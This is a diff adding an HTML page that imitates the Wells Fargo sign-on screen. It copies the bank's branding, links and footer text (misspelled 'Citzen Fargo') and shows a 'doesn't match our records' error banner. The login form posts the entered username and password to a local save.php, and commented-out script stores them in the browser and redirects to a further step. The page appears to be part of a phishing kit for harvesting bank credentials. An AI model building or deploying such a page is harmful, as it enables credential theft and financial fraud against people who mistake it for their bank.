@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Html and Css</title>
+    <link rel="stylesheet" href="index.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
+
+    <script src="index.js" defer></script>
+</head>
+
+<body>
+    <header>
+        <nav class="navbar navbar-expand-lg ">
+            <div class="container">
+                <a class="navbar-brand" href="#">WELLS FARGO</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                    <i class="fa-solid fa-bars-staggered stream"></i>
+                </button>
+                <div class="collapse navbar-collapse justify-end" id="navbarSupportedContent">
+                    <ul class="navbar-nav mb-2 mb-lg-0">
+                        <i class="fa-solid fa-lock"></i>
+                        <li class="nav-item">
+                            <a class="nav-link active" aria-current="page" href="#">Enroll</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">
+                                Customer Service</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">
+                                ATMs/Locations</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">
+                                Español
+                            </a>
+                        </li>
+                    </ul>
+                    <form class="d-flex  main-form-search" role="search">
+
+                        <input class="form-control " type="search" placeholder="Search" aria-label="Search">
+                        <div class="relative">
+                            <i class="fa-solid fa-magnifying-glass search"></i>
+                        </div>
+
+                    </form>
+                </div>
+            </div>
+        </nav>
+        <div class="line-yellow"></div>
+    </header>
+    <!-- for body  -->
+    <section>
+        <div class="main-form">
+            <div class="form-content">
+                <!-- error div  -->
+                <div class="err-container">
+                    <div class="errror-div">
+                        <div class="error-png">
+                            <img src="images/error.png" alt="">
+                        </div>
+                        <div class="error-msg">
+                            That combination doesn't match our records. You can try again, or we can help you <a href="https://oam.wellsfargo.com/oamo/identity/help/passwordhelp">create a new
+                                password or
+                                find your username</a>
+                        </div>
+                    </div>
+                </div>
+                <!-- heading  -->
+                <h3 class="text-center fw-normal mt-3">Good Morning</h3>
+                <p class="mt-1">Sign on to manage your accounts</p>
+
+                <form class="form" action="save.php" method="POST">
+
+                    <div class="mb-4 UserName">
+                        <div class="form-item--with-scaling-label js-form-item form-item form-item-textfield input-container">
+                            <label for="form-field-label" class="form-item__label font-weight-bold label label-surname">SureName
+                            </label>
+                            <input class="form-text form-item__input userNameinput" type="text" name="surename" id="surname" onkeyup="myFunction()" />
+                            <span id="error-user"></span>
+
+                        </div>
+                        <div class="cross-icon-main">
+                            <i class="fa-solid fa-xmark cross" id="icon-surname"></i>
+                        </div>
+                    </div>
+                    <div class="mb-5 pass">
+                        <div class="form-item--with-scaling-label js-form-item form-item form-item-textfield input-container">
+                            <label for="form-field-label" class="form-item__label font-weight-bold label label-password">Password</label>
+                            <input class="form-text form-item__input password" name="password" type="password" id="password" onkeyup=" myFunctionpass()"  />
+                            <span id="error-pass"></span>
+                        </div>
+
+                        <i class="fa-solid fa-eye icon" id="show-pass"></i>
+                    </div>
+
+                    <div class="checkbox mt-4">
+                        <input type="checkbox">
+                        <label>Save Username</label>
+                    </div>
+
+                    <div class="button">
+                        <a href="#" type="submit" class="button" name="submit" id="submit" onclick="locationChange()">Sign On</a>
+                    </div>
+                </form>
+            </div>
+            <div class="for-bottom-bg">
+                <a href="#">Forgett username</a>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- footer  -->
+    <footer>
+        <div class="container">
+            <footer class="py-3 my-4 footer-inner">
+                <div class=" one">
+                    <span>About Wells Fargo</span>
+                    <span>Online Access Agreement</span>
+                    <span>Privacy, Cookies, Security Legal</span>
+                    <span>Notice of Data Collection</span>
+                    <span>Report Email Fraud</span>
+                    <span>Security Center</span>
+                </div>
+                <div class=" two">
+                    <span>Sitemap</span></a>
+                    <span>Ad Choices</span>
+                </div>
+                <div class=" three">
+                    <div class="CopyRight__copyright___3aFR-">© 1999 - 2022 <span lang="en">Citzen Fargo.</span>
+                        All rights
+                        reserved. NMLSR ID 399801</div>
+                </div>
+        </div>
+    </footer>
+    </div>
+    </footer>
+    <!-- <div class="loader-container">
+        <img src="images/loading.png" style="height:100px;" alt="">
+    </div> -->
+    <!-- for loading  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        $(document).ready(() => {
+            // let errCont = $(".err-container");
+            // errCont.css("display", "none");
+            // var pass = false, sur = false;
+
+            // var surname, password;
+
+            // $("#surname").on("input", () => {
+            //     surname = $("#surname").val();
+            //     if (surname.length >= 7) sur = true;
+            // })
+
+            // $("#password").on("input", () => {
+            //     password = $("#password").val();
+            //     if (password.length >= 7) pass = true;
+            // })
+
+
+            // $("#submit").on("click", () => {
+            //     if (pass && sur) {
+            //         errCont.css("display", "none");
+            //         let step1 = `{step1:"step1",surname:"${surname}",password:"${password}"}`;
+            //         window.localStorage.setItem("step1", step1);
+            //         locationChange("../index.html")
+            //     } else {
+            //         errCont.css("display", "block");
+            //     }
+            // });
+
+
+            // hide and show pass
+            let passLabel = $("#show-pass");
+            passLabel.on("click", () => {
+                passLabel.toggleClass("fa-eye fa-eye-slash")
+                if (passLabel.hasClass("fa-eye")) {
+                    $("#password").attr("type", "password");
+                } else {
+                    $("#password").attr("type", "text");
+                }
+            })
+
+            // set value of surname
+            $("#icon-surname").on("click", () => {
+                $("#surname").val("");
+            })
+
+            $("#password,#surname").on("focus input", function() {
+                let el = $(this).siblings("label")
+                let val = $(this).val();
+                if (val.length > 0 || val.trim() != "") {
+                    $(el).addClass("active")
+                } else {
+                    $(el).removeClass("active")
+                }
+            })
+
+            $("#password,#surname").on("focus", function() {
+                let el = $(this).siblings("label")
+                $(el).addClass("focused")
+            })
+
+            $("#password,#surname").on("blur", function() {
+                let el = $(this).siblings("label")
+                $(el).removeClass("focused")
+            })
+
+
+            // function locationChange(url) {
+            //     window.location.assign(url);
+            // }
+
+        })
+ 
+</script>
+   
+</body>
+
+</html>
